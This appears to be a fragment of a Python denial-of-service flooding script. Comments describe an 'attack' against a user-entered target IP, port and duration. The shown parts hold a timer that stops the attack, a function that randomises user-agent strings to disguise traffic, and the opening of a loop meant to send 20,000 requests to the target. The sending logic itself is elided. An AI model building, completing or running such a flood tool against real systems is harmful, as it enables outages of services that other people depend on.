...
# Timer function to allow the attack to run for a custom duration
def timer(timeout):
    start_time = time.time()  # Record the start time
    while True:
        if time.time() - start_time > timeout:  # Check if the timeout has been reached
            exit()  # Exit the script after the timeout
        time.sleep(0.1)  # Small sleep to avoid overloading the CPU

def rand_ua():
    return random.choice(base_user_agents) % (
        random.random() + 5, random.random() + random.randint(1, 8), random.random(),
        random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)),
        random.random())

# Get user input for the target IP, port, and duration
...
# Attack logic (sending requests to the target)
for x in range(20000):  # Adjust as needed
